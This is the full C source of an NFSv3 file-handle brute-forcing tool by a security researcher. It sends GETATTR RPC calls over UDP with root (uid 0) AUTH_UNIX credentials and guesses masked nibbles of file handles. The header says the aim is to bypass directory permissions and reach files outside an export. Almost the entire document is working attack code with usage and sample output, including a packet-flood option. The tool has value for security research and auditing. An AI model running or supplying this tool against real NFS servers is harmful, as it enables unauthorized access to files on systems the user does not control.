
/*
 * Copyright (C) 2023-2024 Claes M Nyberg <cmn@signedness.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Claes M Nyberg.
 * 4. The name Claes M Nyberg may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * What: NFS File handle brute force
 * When: Spring 2023
 * Who: Claes M Nyberg <cmn@signedness.org>
 * Version: 1.1
 * Compile: cc -Wall -pedantic -o 516-brutefh 516-brutefh-v11.c  -lm -lpthread
 *
 * -=[ Overview
 * This tool uses UDP and the GETATTR RPC Call in NFS version 3 to brute force
 * file handles. As has been explored by some of the folks at signedness.org, many 
 * operating systems provide criminally weak file handles that can be guessed, 
 * sometimes very easily. Some operating systems even has their own system calls 
 * for translating from path to file handle and vice versa, and states that 
 * those are only available to root because they bypass directory permissions. 
 * Well, you can also guess file handles remotely (although it might require 
 * root on the client machine ...) and bypass directory permissions. Sometimes file 
 * handles also can be leaked, and then you can access all kinds of interesting 
 * files and directories, often remotely, in a path far, far away from your mount 
 * point. :)
 *
 * Usage: ./516-brutefh <server-ip> <fh-hexmask> [Option(s)]
 * Options:
 *  -f --flood <nsec-delay>  - Do not Wait for reply, just flood packets
 *  -p --port <port>         - Server nfs port, defaults to 2049
 *  -P --sport <port>        - UDP source port, defaults to 516
 *  -r --random              - Randomize nibbles marked with ? (default is to count)
 *  -v --verbose             - Verbose level, repeat to increase
 *
 * The <fh-hexmask> is a string of hexadecimal characters where the ones to be 
 * brute forced are replaced with a question mark ('?'), i.e. representing a half byte
 * (nibble). If the number of nibbles, and thus bytes in total is less than, or equal 
 * to a 64 bit value, the brute force is in count mode. That is, the brute force will 
 * try all values possible and replace the nibbles, with the corresponding bits 
 * in the counter. If random mode is enabled, values are simply randomized forever.
 *
 * Example:
 * $ ./brutefh 192.168.56.110 0000000062e9877c0?0000000?000000fc4fad170000000000000000
 * NFS File Handle Brute Forcer v1.1
 * By CMN <cmn@signedness.org>, spring 2023
 * [2023-05-14 15:43:25] Counted randomize mask for 2 nibble(s)
 * [2023-05-14 15:43:25] Using counter, maximum value is 0x00000000000000ff
 * [2023-05-14 15:43:25] Using seed 0x646d19a0
 * [2023-05-14 15:43:25] Sleeping for 1000 nanoseconds between packets
 * [2023-05-14 15:43:25] Running file handle brute force against 192.168.56.110:2049
 * [2023-05-14 15:43:25] ** Press enter for status **
 * [2023-05-14 15:43:25] Receiver thread running
 * [2023-05-14 15:43:25] [++] Found filehandle for 192.168.56.110 (XID=0x6b8b4594): 0000000062e9877c0c00000002000000fc4fad170000000000000000
 * [2023-05-14 15:43:27] Finished
 *
 * -=[ Changelog:
 *	1.1 - Added wait for RPC reply using pthread mutex and timeout
 */

#define BRUTEFH_VERSION	"1.1"

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <getopt.h>
#include <string.h>
#include <errno.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>
#include <math.h>
#include <pthread.h>

#include <stdint.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>

/* local routines */
static void verbose(unsigned int, char *, ...);
static char *timestamp(char *, size_t);
static char *hhmmss(time_t, char *, size_t);


/* Timeout, resend packet */
#define RESEND_TIMEOUT_SEC	2

/* Maximum file header length */
#define FH_MAXLEN	128


/* Byte represented as two nibbles */
typedef struct {
	uint8_t low:4;
	uint8_t high:4;
} __attribute__((packed)) nibbles_t;


typedef struct {
	union {
		nibbles_t n;
		uint8_t b;
	} v;
} __attribute__((packed)) byte_t;


/* Global configuration and variables */
struct conf {
	uint32_t fhlen;
	char *server;
	uint32_t server_ip;
	uint16_t nfs_port;
	uint16_t sport;
	uint32_t verbose;

	uint8_t random;
	uint8_t flood;

	uint32_t nsleep;
	struct timespec ns;

	char *fhmask;

	/* Brute force context */
	struct fh_brute {
		uint32_t len;			/* Length of byte array */
		byte_t *raw;			/* The raw bytes */
		byte_t *randmask;		/* The nibbles to randomize set to 1 */

		uint64_t rounds;		/* Number of rounds so far */

		uint64_t nibcount;		/* Number of nibbles to randomize */
		uint64_t maxcount;		/* Maximum value for all randomized nibbles */
		uint64_t counter;		/* Current counter */

		struct timeval start;	/* Time started */
	} fb;
} cfg;

/* The global array of previously sent file handlers */
struct fhinfo {
	uint32_t xid; 

	uint8_t got_reply;
	pthread_cond_t reply;
	pthread_mutex_t mtx;

	uint8_t *fhbuf;
	uint32_t fhlen;
};

/* Number of file handles to  store in backlog */
#define FH_BACKLOG_SIZE	0xffff

/* The file handle backlog buffer */
static struct fhinfo *fhbacklog[FH_BACKLOG_SIZE+1];

/*
 * Initialize the backlog buffer.
 */
int
fhbacklog_init(size_t fhlen)
{
    int i;

    memset(&fhbacklog, 0x00, sizeof(fhbacklog));
    for (i=0; i<FH_BACKLOG_SIZE; i++) {
        struct fhinfo *fhi;

		if ( (fhi = calloc(1, sizeof(struct fhinfo))) == NULL) {
			fprintf(stderr, "** Error: Failed to allocate memory\n");
			return -1;
		}

        if ( (fhi->fhbuf = calloc(1, fhlen)) == NULL) {
            fprintf(stderr, "** Error: Failed to allocate memory\n");
            return -1;
        }

        fhi->xid = 0;
		fhi->got_reply = 0;
        fhi->fhlen = fhlen;

        pthread_cond_init(&fhi->reply, NULL);
        pthread_mutex_init(&fhi->mtx, NULL);

		fhbacklog[i] = fhi;
    }

    return 0;
}



/*
 * Returns the length of received data on success, -1 on error.
 */
ssize_t
udp_recv(int sock, uint32_t ip, uint16_t port, uint8_t *buf, size_t buflen)
{
	ssize_t len;
	struct sockaddr_in sa;
	socklen_t addrlen;

	memset(&sa, 0x00, sizeof(struct sockaddr_in));
	sa.sin_family = PF_INET;
	sa.sin_addr.s_addr = ip;
	sa.sin_port = port;
	addrlen = sizeof(struct sockaddr_in);	

	if ( (len = recvfrom(sock, buf, buflen, 0, (struct sockaddr *)&sa, &addrlen)) == -1) {
		fprintf(stderr, "** Error: recvfrom() failed: %s\n", strerror(errno));
		return -1;
	}

	return len;
}


/*
 * Send UDP datagram.
 * On success, the length of the response is returned.
 * IP and port in network byte order.
 */
ssize_t
udp_sendto(int sock, uint32_t ip, uint16_t port, uint8_t *buf, size_t buflen)
{
	struct sockaddr_in da;
	socklen_t addrlen;

	memset(&da, 0x00, sizeof(struct sockaddr_in));
	da.sin_family = PF_INET;
	da.sin_addr.s_addr = ip;
	da.sin_port = port;
	addrlen = sizeof(struct sockaddr_in);

	if (sendto(sock, buf, buflen, 0, (struct sockaddr *)&da, addrlen) < 0) {
		fprintf(stderr, "** Error: sendto() failed: %s\n", strerror(errno));
		return -1;
	}

	return 0;
}

/*
 * Create UDP socket and bind to address.
 * IP and port in network byte order.
 * Returns a socket descriptor on success, -1 on error;
 */
int
udp_socket(uint32_t ip, uint16_t port)
{
	int sock;
	struct sockaddr_in usin;

	if ( (sock = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
		return(-1);

	memset(&usin, 0x00, sizeof(usin));
	usin.sin_family = PF_INET;
	usin.sin_addr.s_addr = ip;
	usin.sin_port = port;

	if (bind(sock, (struct sockaddr *)&usin, sizeof(usin)) < 0) {
		close(sock);
		return(-1);
	}

	return(sock);
}

/*
 * Translate hostname or dotted decimal host address
 * into a network byte ordered IP address.
 * Returns -1 on error.
 */
long
net_inetaddr(const char *host)
{
	long haddr;
	struct hostent *hent;

	if ( (haddr = inet_addr(host)) == -1) {
		if ( (hent = gethostbyname(host)) == NULL)
			return(-1);
		memcpy(&haddr, (hent->h_addr), sizeof(haddr));
	}

	return(haddr);
}


/*
 * Print status 
 */
void
print_status(struct fh_brute *fb)
{
	struct timeval now;
	uint32_t elapsed;
	uint32_t ratio;
	char percent[24];
	char runtime[128];
	char speed[64];
	char eta[64];
	int countmode;

	gettimeofday(&now, NULL);
	if (fb->maxcount && !cfg.random)
		countmode = 1;
	else
		countmode = 0;

	/* Time elapsed in seconds */
	elapsed = now.tv_sec - fb->start.tv_sec;
	hhmmss(elapsed, runtime, sizeof(runtime));

	/* rounds per second */
	ratio = fb->rounds;
	if (elapsed > 0)
		ratio = fb->rounds / elapsed;
	snprintf(speed, sizeof(speed), "%u fh/sec", ratio);

	eta[0] = '\0';
	percent[0] = '\0';

	/* Estimated time left  for counter mode */
	if (countmode && ratio != 0) {
		uint64_t count_left;
		uint32_t sec_left;
		float p;

		count_left = (fb->maxcount - fb->counter);
		sec_left = count_left / ratio;
		hhmmss(sec_left, eta, sizeof(eta));

		p = (float)fb->counter / fb->maxcount;
		snprintf(percent, sizeof(percent), "%.3f%%", p*100);
	}

	verbose(0, "%s Running for %s at %s %s %s\n", 
		percent, runtime, speed, countmode ? "ETA" : "", eta);
}

/*
 * Only print if verbose level is high enough
 */
void
verbose(unsigned int level, char *fmt, ...)
{
    va_list ap;
    char ts[128];

    if (cfg.verbose < level)
        return;

    timestamp(ts, sizeof(ts)-1);
	printf("[%s] ", ts);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
}


/*
 * Create timestamp
 */
char *
timestamp(char *buf, size_t buflen)
{
	struct tm *tm;
	time_t caltime;

	time(&caltime);

	if ( (tm = localtime(&caltime)) == NULL)
		return(NULL);

	if (strftime(buf, buflen, "%Y-%m-%d %H:%M:%S", tm) == 0)
		return(NULL);

	return buf;
}

/*
 * Convert seconds into hh:mm:ss string
 */
char *
hhmmss(time_t sec, char *buf, size_t buflen)
{
    uint32_t h, m;

    h = sec / 3600;
    sec -= (h*3600);
    m = sec / 60;
    sec -= m * 60;
    snprintf(buf, buflen, "%02u:%02u:%02u", h, m, (uint32_t)sec);
    return(buf);
}


/*
 * Create RPC Call header for GETATTR in the supplied buffer.
 * Returns the length on success, -1 on error.
 * The call header need to be appended with a filehandle before
 * it is sent to the nfs server .
 */
int
mkrpc_call_nfs_getattr(uint32_t xid, uint8_t *buf, uint32_t buflen)
{
	struct rpc_call_getattr {
		/* RPC Header */
		uint32_t xid;
		uint32_t msgtype;
		uint32_t version;
		uint32_t program;
		uint32_t program_version;
		uint32_t procedure;

		/* Credentials */
		uint32_t cr_flavor;
		uint32_t cr_length;
		uint32_t stamp;
	
		uint32_t machine_name_len;
		uint8_t machine_name[8];
		uint32_t uid;
		uint32_t gid;

		uint32_t aux_gids;
		uint32_t aux_gid;

		/* Verifier */
		uint32_t ver_flavor;
		uint32_t ver_length;

		/* NFS Filehandle goes here */

	} __attribute__((packed)) *rpc;

	if (buflen < sizeof(struct rpc_call_getattr))
		return -1;

	memset(buf, 0x00, buflen);
	rpc = (struct rpc_call_getattr *)buf;

	rpc->xid = htonl(xid);
	rpc->msgtype = htonl(0); /* Call */
	rpc->version = htonl(2); /* RPC Version */
	rpc->program = htonl(100003); /* NFS */
	rpc->program_version = htonl(3);
	rpc->procedure = htonl(1); /* GETATTR */

	rpc->cr_flavor = htonl(1); /* AUTH_UNIX */
	rpc->cr_length = htonl(32); /* Length */
	rpc->stamp = htonl(0);
	
	rpc->machine_name_len = htonl(7);
	memcpy(rpc->machine_name, "desktop", 7);

	rpc->uid = htonl(0);
	rpc->gid = htonl(0);

	rpc->aux_gids = htonl(1);
	rpc->aux_gid = htonl(0);

	rpc->ver_flavor = htonl(0); /* AUTH_NULL */
	rpc->ver_length = htonl(0);

	return sizeof(struct rpc_call_getattr);
}

void
hexdump(uint8_t *pt, size_t len)
{
	size_t i = 0;
	for (;i<len; i++)
		printf("%02x", pt[i]);
}


/*
 * Convert hex character to nibble value,
 * returns value on success, -1 on error
 */
uint8_t
hexchr_tonibble(char *h)
{
	char val[4];
	char *ep;
	uint8_t v;

	val[0] = h[0];
	val[1] = '\0';

	v = (uint8_t)strtoul(val, &ep, 16);
	if (errno == EINVAL || *ep != '\0') {
		fprintf(stderr, "** Panic: Invalid hexadecimal character: %c\n", (int)val[0]);
		exit(EXIT_FAILURE);
	}

	return v;
}

/*
 * Initialize the fileheader based on supplied mask
 * Returns -1 on error, and zero on success.
 */
int
init_fh_brute(char *fhmask, struct fh_brute *fb)
{
	size_t fhlen;
	size_t i;
	size_t j;

	fhlen = strlen(fhmask);
	memset(fb, 0x00, sizeof(struct fh_brute));

	if (fhlen % 2 != 0) {
		fprintf(stderr, " ** Error: Hexadecimal filehandle string must be of even length\n");
		return -1;
	}

	fb->len = fhlen/2;

	if ( (fb->randmask = calloc(1, fb->len)) == NULL) {
		fprintf(stderr, " ** Error: Failed to allocate %lu bytes\n", fhlen/2);
		return -1;
	}

	if ( (fb->raw = calloc(1, fb->len)) == NULL) {
		fprintf(stderr, " ** Error: Failed to allocate %lu bytes\n", fhlen/2);
		return -1;
	}


	/* Traverse mask */
	for (i=0,j=0; i<fhlen; i+=2,j++) {

		if (isxdigit(fhmask[i])) {
			fb->raw[j].v.n.high = hexchr_tonibble(&fhmask[i]);
		}

		if (isxdigit(fhmask[i+1])) {
			fb->raw[j].v.n.low = hexchr_tonibble(&fhmask[i+1]);
		}

		/* Randomize high nibble */
		if (fhmask[i] == '?') {
			fb->randmask[j].v.n.high = 1;
			fb->nibcount++;
		}

		/* Randomize low nibble */
		if (fhmask[i+1] == '?') {
			fb->randmask[j].v.n.low = 1;
			fb->nibcount++;
		}
	}

	if (fb->nibcount == 0) {
		fprintf(stderr, " ** Error: Nothing to brute, replace hex characters with '?'\n");
		return -1;
	}

	verbose(0, "Counted randomize mask for %lu nibble(s)\n", fb->nibcount);

	/* We can use a 64bit variable to cover all nibbles with a counter */
	if (!cfg.random) {
		if (fb->nibcount <= 16) {
			fb->maxcount = (uint64_t)pow(2, fb->nibcount * 4) - 1;
			verbose(0, "Using counter, maximum value is 0x%016lx\n", fb->maxcount);
		}
	}
	else {
		verbose(0, "Using random, will run forever ...");
	}
	return 0;
}


/*
 * Randomize "next" fh.
 * Buffer must have at least fb->len number of bytes.
 */
void
rand_fh(struct fh_brute *fb, uint8_t *buf)
{
	size_t i;

	for (i=0; i<fb->len; i++) {
		byte_t b;

		b.v.n.high = fb->raw[i].v.n.high;
		b.v.n.low = fb->raw[i].v.n.low;

		if (fb->randmask[i].v.n.high == 1) {
			b.v.n.high = (uint8_t)rand();	
		}

		if (fb->randmask[i].v.n.low == 1) {
			b.v.n.low = (uint8_t)rand();	
		}

		buf[i] = (uint8_t)b.v.b;
	}

	if (cfg.verbose >= 1) {
		printf("Randomized filehandle: ");
		hexdump(buf, fb->len);
		printf("\n");
	}
}

/*
 * Count "next" fh.
 * Buffer must have at least fb->len number of bytes.
 */
void
count_fh(struct fh_brute *fb, uint8_t *buf)
{
    size_t i;
	size_t j;
	size_t n;

	union {
		uint64_t counter;
		byte_t nibbles[8];
	} cnt;

	cnt.counter = fb->counter;
	verbose(3, "Counter: 0x%016lx\n", cnt.counter);
	fb->counter++;

    for (i=0, j=0, n=0; i<fb->len; i++) {
        byte_t b;

        b.v.n.high = fb->raw[i].v.n.high;
        b.v.n.low = fb->raw[i].v.n.low;

        if (fb->randmask[i].v.n.high == 1) { 
			if (n==0) {
            	b.v.n.high = (uint8_t)cnt.nibbles[j].v.n.low;
				n = 1;
			}
			else if (n==1) {
				b.v.n.high = (uint8_t)cnt.nibbles[j].v.n.high;
				n = 0;
				j++;
			}
        }

        if (fb->randmask[i].v.n.low == 1) {
			if (n==0) {
            	b.v.n.low = (uint8_t)cnt.nibbles[j].v.n.low;
				n = 1;
			}
			else if (n==1) {
				b.v.n.low = (uint8_t)cnt.nibbles[j].v.n.high;
				n = 0;
				j++;
			}
        }

        buf[i] = (uint8_t)b.v.b;
    }

    if (cfg.verbose >= 2) {
        verbose(2, "Counted filehandle: ");
        hexdump(buf, fb->len);
        printf("\n");
    }
}

/* Argument to thread function */
struct thread_arg {
	int sock;
};

void *
thread_receiver(void *arg)
{
	struct thread_arg *a;

	struct rpcreply {
		/* RPC */
		uint32_t xid;
		uint32_t type;
		uint32_t reply_state;

		/* Verifier */
		uint32_t flavor;
		uint32_t length;

		uint32_t accept_state;

		/* NFS */
		uint32_t status;
	} __attribute__((packed)) *rpc;


	a = (struct thread_arg *)arg;

	verbose(0, "Receiver thread running\n");	
	while (1) {
		uint8_t buf[8192];
		ssize_t len;
		
		if ( (len = udp_recv(a->sock, cfg.server_ip, cfg.nfs_port, buf, sizeof(buf))) < 0) {
			fprintf(stderr, "** Error: Failed to receive on UDP socket: %s\n", 
				strerror(errno));
			break;
		}
		rpc = (struct rpcreply *)buf;

		if (len < sizeof(struct rpcreply)) {
			fprintf(stderr, "** Warning: Ignoring short response\n");
			continue;
		}

		/* RPC Reply */
		if (ntohl(rpc->type) == 1) {
			struct fhinfo *fhi;
			uint32_t xid = ntohl(rpc->xid);
			int idx = xid % FH_BACKLOG_SIZE;

			verbose(2, "Received RPC reply with XID 0x%08x (idx %d)\n", 
				ntohl(rpc->xid), idx);

			fhi = fhbacklog[idx];
			if (fhi->xid == xid) {

				if (rpc->reply_state == 0) {
					if ((rpc->accept_state == 0) && (rpc->status == 0)) { 
						verbose(0, "[++] Found filehandle for %s (XID=0x%08x): ", 
							cfg.server, xid);
						hexdump(fhi->fhbuf, fhi->fhlen);
						printf("\n");
					}
				}

				/* Signal that we got response */
				pthread_mutex_lock(&fhi->mtx);
				fhi->got_reply = 1;
				pthread_cond_signal(&fhi->reply);
				pthread_mutex_unlock(&fhi->mtx);
			}
		}
	}
	return NULL;
}

void *
thread_status(void *arg)
{
	int c;
	struct fh_brute *fb = (struct fh_brute *)arg;

	verbose(0, "** Press enter for status **\n");
	while ( (c = getc(stdin)) != EOF) {
		if (c == '\n')
			print_status(fb);
	}

	return NULL;
}

void
brute_fh(struct fh_brute *fb)
{
	pthread_attr_t attr;
	struct thread_arg *arg;
	pthread_t t;
	uint8_t rpc[2048];
	uint32_t xid;
	int rpclen;
	int finished;
	int sock;
	uint32_t fhlen;
	uint32_t totlen;
	int countmode;

	if ( (arg = calloc(1, sizeof(struct thread_arg))) == NULL) {
		fprintf(stderr, "** Error: Failed to allocate %lu bytes\n", 
			sizeof(struct thread_arg));
		return;
	}

	if ( (rpclen = mkrpc_call_nfs_getattr(0x00, rpc, sizeof(rpc))) < 0) 
		return;

	if ( (sock = udp_socket(0x00, cfg.sport)) < 0) {
		fprintf(stderr, "** Error: Failed to create udp socket: %s\n",
			strerror(errno));
		return;
	}

	if (fhbacklog_init(fb->len) < 0)
		return;

	arg->sock = sock;
	pthread_attr_init(&attr);
	if ( (pthread_create(&t, &attr, thread_receiver, (void *)arg)) != 0) {
		fprintf(stderr, "** Error: Failed to create thread: %s\n",
			strerror(errno));
		return;
	}

	if ( (pthread_create(&t, &attr, thread_status, (void *)fb)) != 0) {
		fprintf(stderr, "** Error: Failed to create thread: %s\n",
			strerror(errno));
		return;
	}
	pthread_attr_destroy(&attr);

	xid = rand();
	verbose(1, "Starting XID is 0x%08x\n", xid);
	fhlen = htonl(fb->len);
	totlen = rpclen + sizeof(uint32_t) + fb->len;
	finished = 0;
	fb->rounds = 0;
	gettimeofday(&fb->start, NULL);

	if ((fb->maxcount != 0) && (!cfg.random)) 
		countmode = 1;
	else
		countmode = 0;

	for (;;) {
		struct fhinfo *fhi;	
		int idx;

		if (finished)
			break;

		fb->rounds++;

		/* Increase XID */
		xid++;
		idx = xid % FH_BACKLOG_SIZE;
		fhi = fhbacklog[idx];
		fhi->xid = xid;
		fhi->got_reply = 0;

		if (countmode) {
			count_fh(fb, fhi->fhbuf);

			if ((fb->counter - 1) == fb->maxcount)
				finished = 1;
		}
		else {
			rand_fh(fb, fhi->fhbuf);
		}

		/* Set XID and copy file handle at the end of the RPC Call */
		*(uint32_t *)rpc = htonl(xid);
		memcpy((uint8_t *)rpc + rpclen, &fhlen, sizeof(uint32_t));
		memcpy((uint8_t *)rpc + rpclen + sizeof(uint32_t), fhi->fhbuf, fhi->fhlen);

		/* Send the call */
	send_pkt:
		if (cfg.flood == 0)
			pthread_mutex_lock(&fhi->mtx);

		if ((fb->rounds % 100000) == 0) {
			verbose(1, "Sent %lu RPC Calls, current XID/rand is 0x%08x\n", 
				fb->rounds, xid);
		}

		verbose(2, "Sending RPC Call with XID 0x%08x (idx %d)\n", xid, idx);
		if (udp_sendto(sock, cfg.server_ip, cfg.nfs_port, rpc, totlen) < 0) {
			fprintf(stderr, "** Error: Failed to send udp datagram: %s\n",
				strerror(errno));
			break;
		}

		/* Do not wait for a reply, just sleep and send next packet */
		if (cfg.flood) {
			nanosleep(&cfg.ns, NULL);
			continue;
		}

		/* Check for reply and possibly resend packet */
		else {
			struct timeval tv;
			struct timespec ts;
			int ret;

			/* Resend after two seconds */
			gettimeofday(&tv, NULL);
			ts.tv_sec = tv.tv_sec + RESEND_TIMEOUT_SEC;
			ts.tv_nsec = tv.tv_usec * 1000;

			ret = pthread_cond_timedwait(&fhi->reply, &fhi->mtx, &ts);
			pthread_mutex_unlock(&fhi->mtx);

			if (ret == ETIMEDOUT) {
				verbose(0, "Timeout, no reply, resending RPC call (XID 0x%08x)\n", xid);
				goto send_pkt;
			}
		}
	}
}


static void
usage(char *pname)
{
	printf("\n");
	printf("Usage: %s <server-ip> <fh-hexmask> [Option(s)]\n", pname);
	printf("Options:\n");
	printf(" -f --flood <nsec-delay>  - Do not Wait for reply, just flood packets\n");
	printf(" -p --port <port>         - Server nfs port, defaults to %u\n", ntohs(cfg.nfs_port));
	printf(" -P --sport <port>        - UDP source port, defaults to %u\n", ntohs(cfg.sport));
	printf(" -r --random              - Randomize nibbles marked with ? (default is to count)\n");
	printf(" -v --verbose             - Verbose level, repeat to increase\n");
	printf("\n");
	exit(EXIT_FAILURE);
}


/* Commandline options */
const struct option longopts[] =
{
    {"flood", 1, NULL, 'f'},
    {"port", 1, NULL, 'p'},
    {"sport", 1, NULL, 'P'},
    {"random", 0, NULL, 'r'},
    {"verbose", 0, NULL, 'v'},
    {NULL, 0, NULL, 0}
};


int
main(int argc, char **argv)
{
	int longindex;
	uint32_t seed;
	int i;

	printf("NFS File Handle Brute Forcer v%s\n", BRUTEFH_VERSION);
	printf("By Claes M Nyberg <cmn@signedness.org>, spring 2023\n");

	/* Default values */
	seed = time(NULL) ^ getpid();
	memset(&cfg, 0x00, sizeof(cfg));
	cfg.nfs_port = htons(2049);
	cfg.nsleep = 500000;
	cfg.sport = htons(516);

	if (argc < 3)
		usage(argv[0]);
	
	cfg.fhmask = argv[2];
	if ( (strlen(cfg.fhmask)*2) > FH_MAXLEN) {
		fprintf(stderr, "File header exceeds maximum length of %u bytes\n", 
			FH_MAXLEN);
		exit(EXIT_FAILURE);
	}

	cfg.server = argv[1];
	if ( (cfg.server_ip = net_inetaddr(argv[1])) == -1) {
		fprintf(stderr, "Failed to resolve server IP %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	while ( (i = getopt_long(argc-2, &argv[2], "f:p:P:rv", longopts, &longindex)) != -1) {

		switch (i) {

			case 'f':
				cfg.flood = 1;
				cfg.ns.tv_sec = 0;
				cfg.ns.tv_nsec = strtoul(optarg, NULL, 0);
				break;

			case 'P':
				cfg.sport = htons(atoi(optarg));
				if (cfg.sport == 0) {
					fprintf(stderr, "** Error: Invalid source port\n");
					exit(EXIT_FAILURE);
				}
				break;

			case 'p':
				cfg.nfs_port = htons(atoi(optarg));
				if (cfg.nfs_port == 0) {
					fprintf(stderr, "** Error: Invalid server nfs port\n");
					exit(EXIT_FAILURE);
				}
				break;

			case 'r':
				cfg.random = 1;
				break;

			case 'v':
				cfg.verbose++;
				break;

			default:
				usage(argv[0]);
		}
	}

	if (init_fh_brute(cfg.fhmask, &cfg.fb) < 0)
		exit(EXIT_FAILURE);

	verbose(1, "Using seed 0x%08x\n", seed);
	srand(seed);
	verbose(1, "Using resend timeout of %d sec\n", RESEND_TIMEOUT_SEC);
	if (cfg.flood) 
		verbose(0, "Sleeping for %u nanoseconds between packets\n", cfg.ns.tv_nsec);
	verbose(0, "Running file handle brute force against %s:%u\n", 
		cfg.server, ntohs(cfg.nfs_port));

	brute_fh(&cfg.fb);
	verbose(0, "Finished\n");
}
